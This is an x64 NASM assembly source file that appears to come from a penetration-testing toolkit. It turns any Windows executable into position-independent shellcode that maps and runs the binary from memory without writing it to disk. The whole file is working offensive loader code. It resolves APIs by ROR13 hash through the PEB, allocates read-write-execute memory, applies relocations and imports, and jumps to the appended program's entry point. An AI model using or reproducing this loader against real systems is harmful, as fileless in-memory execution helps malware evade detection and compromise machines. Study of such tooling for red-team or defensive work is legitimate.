; General purppose x64 Windows executable to shellcode converter using RunPE technique.
; x64 Windows RunPE shellcode - Position Independent
; Executes a PE binary from memory without writing to disk
; assemble with: nasm -f bin exe_to_shellcode.asm -o shellcode.bin
; Author: Diego Ledda <diego_ledda[at]rapid7[dot]com>

[bits 64]
[default rel]

; Entry point
start:
    push rbp
    mov rbp, rsp
    sub rsp, 0x58              ; 0x58 (not 0x50) to maintain 16-byte alignment after 5 pushes

    ; Save non-volatile registers
    push rbx
    push r12
    push r13
    push r14
    push r15

    ; Find kernel32.dll base via PEB
    call find_kernel32
    mov r12, rax                ; r12 = kernel32.dll base

    ; Resolve GetProcAddress via ror13 hash
    mov rcx, r12
    mov edx, 0x7c0dfcaa        ; ror13("GetProcAddress")
    call find_export_by_hash
    mov r13, rax                ; r13 = GetProcAddress

    ; Resolve LoadLibraryA via ror13 hash
    mov rcx, r12
    mov edx, 0xec0e4e8e        ; ror13("LoadLibraryA")
    call find_export_by_hash
    mov r14, rax                ; r14 = LoadLibraryA

    ; Resolve VirtualAlloc via ror13 hash
    mov rcx, r12
    mov edx, 0x91afca54        ; ror13("VirtualAlloc")
    call find_export_by_hash
    mov [rbp - 0x08], rax       ; save VirtualAlloc on stack

    ; PE header parsing
    lea rbx, [rel pe_buffer]    ; rbx = PE image base
    mov ecx, [rbx + 0x3C]      ; e_lfanew offset
    lea r8, [rbx + rcx]        ; r8 = PE signature

    ; Read fields from optional header (PE + 0x18 = optional header)
    mov rcx, [r8 + 0x30]       ; rcx = ImageBase (lpAddress)
    mov [rbp - 0x18], rcx      ; save preferred ImageBase for relocation delta
    mov ecx, [r8 + 0x50]       ; ecx = SizeOfImage
    mov [rbp - 0x20], ecx      ; save SizeOfImage on stack (r11 is volatile)

    ; VirtualAlloc(ImageBase, SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    mov rcx, [rbp - 0x18]      ; lpAddress = preferred ImageBase
    sub rsp, 0x20
    mov edx, [rbp - 0x20]      ; dwSize = SizeOfImage
    mov r8d, 0x3000             ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x40               ; PAGE_EXECUTE_READWRITE
    call [rbp - 0x08]           ; VirtualAlloc
    add rsp, 0x20
    test rax, rax
    jnz .alloc_ok

    ; Retry without preferred address if first attempt failed
    sub rsp, 0x20
    xor ecx, ecx               ; lpAddress = NULL (let OS choose)
    mov edx, [rbp - 0x20]      ; dwSize = SizeOfImage
    mov r8d, 0x3000             ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x40               ; PAGE_EXECUTE_READWRITE
    call [rbp - 0x08]           ; VirtualAlloc
    add rsp, 0x20
    test rax, rax
    jz .alloc_fail

.alloc_ok:
    mov r15, rax                ; r15 = allocated base

    ; Copy PE headers (SizeOfHeaders at PE+0x54)
    lea rbx, [rel pe_buffer]
    mov ecx, [rbx + 0x3C]
    lea r8, [rbx + rcx]
    mov ecx, [r8 + 0x54]       ; SizeOfHeaders
    lea rsi, [rbx]
    mov rdi, r15
    xor r9, r9
.copy_headers:
    mov al, [rsi + r9]
    mov [rdi + r9], al
    inc r9
    cmp r9, rcx
    jl .copy_headers

    ; Copy sections
    lea rbx, [rel pe_buffer]
    mov ecx, [rbx + 0x3C]
    lea r8, [rbx + rcx]        ; PE signature
    movzx eax, word [r8 + 0x06] ; NumberOfSections
    movzx edx, word [r8 + 0x14] ; SizeOfOptionalHeader
    lea r9, [r8 + 0x18]        ; start of optional header
    add r9, rdx                 ; r9 = first section header
    mov ecx, eax                ; section count

.copy_sections:
    test ecx, ecx
    jz .sections_done
    push rcx

    mov eax, [r9 + 0x10]       ; SizeOfRawData
    mov edx, [r9 + 0x14]       ; PointerToRawData
    mov r10d, [r9 + 0x0C]      ; VirtualAddress

    ; Copy section: pe_buffer+PointerToRawData -> allocated+VirtualAddress
    lea rsi, [rbx + rdx]
    lea rdi, [r15 + r10]
    xor r11, r11
    test eax, eax
    jz .next_section
.copy_section_bytes:
    mov r8b, [rsi + r11]
    mov [rdi + r11], r8b
    inc r11
    cmp r11, rax
    jl .copy_section_bytes

.next_section:
    add r9, 0x28               ; advance to next section header (40 bytes each)
    pop rcx
    dec ecx
    jmp .copy_sections

.sections_done:
    ;------------------------------------------------------------------
    ; Process base relocations
    ; r15 = allocated base, [rbp - 0x18] = preferred ImageBase
    ;------------------------------------------------------------------
    call process_relocations

    ;------------------------------------------------------------------
    ; Process imports
    ; r13 = GetProcAddress, r14 = LoadLibraryA, r15 = image base
    ;------------------------------------------------------------------
    call process_imports

    ; Calculate entry point VA
    lea rbx, [rel pe_buffer]
    mov ecx, [rbx + 0x3C]
    lea r8, [rbx + rcx]
    mov eax, [r8 + 0x28]       ; AddressOfEntryPoint RVA
    add rax, r15               ; entry point VA

    ; Jump to OEP
    sub rsp, 0x20
    call rax
    add rsp, 0x20

.alloc_fail:
    ; Cleanup
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    mov rsp, rbp
    pop rbp
    ret

;----------------------------------------------------------------------
; find_kernel32 - Locate kernel32.dll base via PEB
; Returns: rax = kernel32.dll base address
;----------------------------------------------------------------------
find_kernel32:
    xor rax, rax
    mov rax, [gs:0x60]          ; PEB
    mov rax, [rax + 0x18]       ; PEB->Ldr (PEB_LDR_DATA)
    mov rax, [rax + 0x20]       ; InMemoryOrderModuleList.Flink
    ; 1st entry = executable itself
    mov rax, [rax]              ; 2nd entry = ntdll.dll
    mov rax, [rax]              ; 3rd entry = kernel32.dll
    mov rax, [rax + 0x20]       ; DllBase
    ret

;----------------------------------------------------------------------
; find_export_by_hash - Find an exported function by ROR13 hash
; rcx = module base address
; edx = ror13 hash of target function name
; Returns: rax = function address (0 if not found)
;----------------------------------------------------------------------
find_export_by_hash:
    push rbx
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11

    mov r8, rcx                 ; r8 = module base
    mov r9d, edx                ; r9d = target hash

    ; Parse PE header
    mov ebx, [r8 + 0x3C]       ; e_lfanew
    lea rbx, [r8 + rbx]        ; PE header

    ; Export directory RVA at PE+0x88 (x64)
    mov ebx, [rbx + 0x88]      ; Export directory RVA
    test ebx, ebx
    jz .hash_not_found
    add rbx, r8                 ; Export directory VA

    mov ecx, [rbx + 0x18]      ; NumberOfNames
    mov r10d, [rbx + 0x20]     ; AddressOfNames RVA
    add r10, r8                 ; AddressOfNames VA

.hash_search:
    dec ecx
    js .hash_not_found

    ; Get pointer to this export name
    mov esi, [r10 + rcx * 4]   ; name RVA
    add rsi, r8                 ; name VA

    ; Compute ror13 hash of this export name
    xor edi, edi                ; edi = running hash
.hash_loop:
    movzx eax, byte [rsi]
    test al, al
    jz .hash_compare
    ror edi, 13
    add edi, eax
    inc rsi
    jmp .hash_loop

.hash_compare:
    cmp edi, r9d
    jne .hash_search            ; no match, try next

    ; Match found - get ordinal
    mov r10d, [rbx + 0x24]     ; AddressOfNameOrdinals RVA
    add r10, r8
    movzx ecx, word [r10 + rcx * 2]

    ; Get function address
    mov r10d, [rbx + 0x1C]     ; AddressOfFunctions RVA
    add r10, r8
    mov eax, [r10 + rcx * 4]   ; function RVA
    add rax, r8                 ; function VA

    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbx
    ret

.hash_not_found:
    xor rax, rax
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbx
    ret

;----------------------------------------------------------------------
; process_relocations - Apply base relocation fixups
; Uses: r15 = allocated image base, [rbp - 0x18] = preferred ImageBase
;----------------------------------------------------------------------
process_relocations:
    push rbx
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11

    ; Calculate delta: actual base - preferred base
    mov rax, r15
    sub rax, [rbp - 0x18]
    mov r9, rax                 ; r9 = relocation delta
    test r9, r9
    jz .reloc_done              ; no delta, no fixups needed

    ; Find relocation directory from the mapped image
    ; PE header is at r15 + e_lfanew
    mov eax, [r15 + 0x3C]      ; e_lfanew
    lea r8, [r15 + rax]        ; r8 = PE header in mapped image

    ; DataDirectory[5] = Base Relocation Table
    ; Optional header starts at PE + 0x18
    ; DataDirectory starts at optional_header + 0x70 (x64)
    ; Each entry is 8 bytes (RVA + Size)
    ; Entry 5 is at offset 0x70 + 5*8 = 0x70 + 0x28 = 0x98 from optional header
    ; From PE sig: 0x18 + 0x98 = 0xB0
    mov ebx, [r8 + 0xB0]       ; Relocation directory RVA
    test ebx, ebx
    jz .reloc_done
    mov r10d, [r8 + 0xB4]      ; Relocation directory Size
    test r10d, r10d
    jz .reloc_done

    add rbx, r15               ; rbx = relocation directory VA
    lea r11, [rbx + r10]       ; r11 = end of relocation directory

.reloc_block:
    cmp rbx, r11
    jge .reloc_done

    mov esi, [rbx]              ; VirtualAddress of this block
    mov edi, [rbx + 4]          ; SizeOfBlock
    test edi, edi
    jz .reloc_done              ; SizeOfBlock == 0 means done

    ; Number of entries = (SizeOfBlock - 8) / 2
    lea ecx, [edi - 8]
    shr ecx, 1                  ; ecx = number of relocation entries

    lea r8, [rbx + 8]          ; r8 = first relocation entry in block

.reloc_entry:
    test ecx, ecx
    jz .reloc_next_block

    movzx eax, word [r8]       ; relocation entry (type:4 | offset:12)
    mov edx, eax
    shr edx, 12                 ; edx = type
    and eax, 0x0FFF             ; eax = offset within page

    cmp edx, 10                 ; IMAGE_REL_BASED_DIR64 = 10
    je .reloc_dir64
    cmp edx, 0                  ; IMAGE_REL_BASED_ABSOLUTE = 0 (padding, skip)
    je .reloc_skip
    ; Other types (3 = HIGHLOW for 32-bit) - skip for x64
    jmp .reloc_skip

.reloc_dir64:
    ; Fix up a 64-bit absolute address
    lea rdx, [r15 + rsi]       ; page base VA in mapped image
    add rdx, rax               ; rdx = address of the qword to fix
    add [rdx], r9              ; apply delta

.reloc_skip:
    add r8, 2                  ; next entry (2 bytes each)
    dec ecx
    jmp .reloc_entry

.reloc_next_block:
    add rbx, rdi               ; advance to next block (by SizeOfBlock)
    jmp .reloc_block

.reloc_done:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbx
    ret

;----------------------------------------------------------------------
; process_imports - Resolve the Import Address Table
; Uses: r13 = GetProcAddress, r14 = LoadLibraryA, r15 = image base
;----------------------------------------------------------------------
process_imports:
    push rbx
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11

    ; Find import directory from mapped image
    mov eax, [r15 + 0x3C]      ; e_lfanew
    lea r8, [r15 + rax]        ; r8 = PE header

    ; DataDirectory[1] = Import Table
    ; From PE sig: 0x18 + 0x70 + 1*8 = 0x90
    mov ebx, [r8 + 0x90]       ; Import directory RVA
    test ebx, ebx
    jz .import_done
    add rbx, r15               ; rbx = first IMAGE_IMPORT_DESCRIPTOR

    ;------------------------------------------------------------------
    ; Walk import descriptors (each 20 bytes)
    ; struct IMAGE_IMPORT_DESCRIPTOR {
    ;   +0x00: OriginalFirstThunk (RVA to INT - Import Name Table)
    ;   +0x04: TimeDateStamp
    ;   +0x08: ForwarderChain
    ;   +0x0C: Name (RVA to DLL name string)
    ;   +0x10: FirstThunk (RVA to IAT - Import Address Table)
    ; }
    ;------------------------------------------------------------------
.import_descriptor:
    mov eax, [rbx + 0x0C]      ; Name RVA
    test eax, eax
    jz .import_done             ; null Name = end of descriptors

    ; LoadLibraryA(dll_name)
    lea rcx, [r15 + rax]       ; rcx = DLL name string VA
    sub rsp, 0x20
    call r14                    ; LoadLibraryA
    add rsp, 0x20
    test rax, rax
    jz .import_next             ; skip if LoadLibrary fails
    mov [rbp - 0x28], rax      ; save loaded DLL base on stack (r9 is volatile)

    ; Get OriginalFirstThunk (INT) and FirstThunk (IAT)
    mov eax, [rbx]             ; OriginalFirstThunk RVA
    test eax, eax
    jnz .import_has_oft
    mov eax, [rbx + 0x10]      ; fallback: use FirstThunk if OFT is 0
.import_has_oft:
    lea rsi, [r15 + rax]       ; rsi = INT entries (or IAT if no INT)

    mov eax, [rbx + 0x10]      ; FirstThunk RVA
    lea rdi, [r15 + rax]       ; rdi = IAT entries (where we write resolved addresses)

.import_thunk:
    mov r10, [rsi]             ; read INT entry (64-bit on x64)
    test r10, r10
    jz .import_next             ; null entry = end of this descriptor's imports

    ; Check if import is by ordinal (bit 63 set)
    bt r10, 63
    jc .import_by_ordinal

    ; Import by name: r10 = RVA to IMAGE_IMPORT_BY_NAME
    lea rdx, [r15 + r10]       ; VA of IMAGE_IMPORT_BY_NAME
    add rdx, 2                 ; skip Hint (WORD), point to Name string

    ; GetProcAddress(hModule, lpProcName)
    mov rcx, [rbp - 0x28]      ; hModule = loaded DLL
    sub rsp, 0x20
    call r13                   ; GetProcAddress
    add rsp, 0x20
    jmp .import_write

.import_by_ordinal:
    ; Ordinal is in low 16 bits of r10
    movzx edx, r10w            ; rdx = ordinal
    mov rcx, [rbp - 0x28]      ; hModule = loaded DLL
    sub rsp, 0x20
    call r13                   ; GetProcAddress(hModule, ordinal)
    add rsp, 0x20

.import_write:
    mov [rdi], rax             ; write resolved address to IAT
    add rsi, 8                 ; next INT entry (8 bytes on x64)
    add rdi, 8                 ; next IAT entry
    jmp .import_thunk

.import_next:
    add rbx, 20               ; next IMAGE_IMPORT_DESCRIPTOR (20 bytes)
    jmp .import_descriptor

.import_done:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbx
    ret

pe_buffer:  ; PE image to execute follows here